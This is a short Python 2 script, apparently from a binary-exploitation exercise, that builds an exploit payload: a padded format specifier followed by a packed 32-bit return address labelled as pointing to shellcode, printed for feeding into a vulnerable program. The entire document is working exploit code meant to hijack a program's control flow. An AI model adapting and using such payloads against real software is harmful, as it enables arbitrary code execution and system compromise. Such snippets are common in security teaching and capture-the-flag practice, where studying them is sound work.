import struct

OFFSET = 121
SHELLCODE_ADDRESS = 0xbffffd86

exploit = ''
exploit += '%{0}x'.format(OFFSET)
exploit += struct.pack('I', SHELLCODE_ADDRESS)

print exploit
